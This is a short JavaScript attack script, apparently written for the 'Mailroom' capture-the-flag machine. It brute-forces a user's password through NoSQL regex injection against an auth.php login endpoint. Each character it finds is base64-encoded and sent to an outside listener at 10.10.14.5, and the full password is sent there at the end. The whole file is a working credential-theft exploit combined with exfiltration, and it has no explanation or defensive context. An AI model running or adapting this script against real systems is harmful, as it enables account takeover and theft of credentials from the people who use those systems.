//Work
//NoSql Injection REGEX -> enuemrate password  

var password = ""
var bruteForceChar = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#%:;<>@_=';


for (var i = 0; i < bruteForceChar.length; i++) {
    var guessReq = new XMLHttpRequest();
    guessReq.open("POST", "http://staff-review-panel.mailroom.htb/auth.php",false);
    guessReq.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
    guessReq.send("email=tristan@mailroom.htb&password[$regex]=" + password + bruteForceChar[i] + ".*");

    //Found! Response -> {"success":false,"message":"Invalid input detected"}{"success":true,"message":"Check your inbox for an email with your 2FA token"}
    if (guessReq.responseText.length == 130){
        password += bruteForceChar[i];
        var leakInfoReq = new XMLHttpRequest();
        leakInfoReq.open("GET", "http://10.10.14.5/passFound?=" + btoa(password),true);
        leakInfoReq.send();
        i = 0; //initial guess 
    }

}

//Final 
var doneReq = new XMLHttpRequest();
doneReq.open("GET", "http://10.10.14.5/donebs64?=" + btoa(password),true);
doneReq.send();


///---------
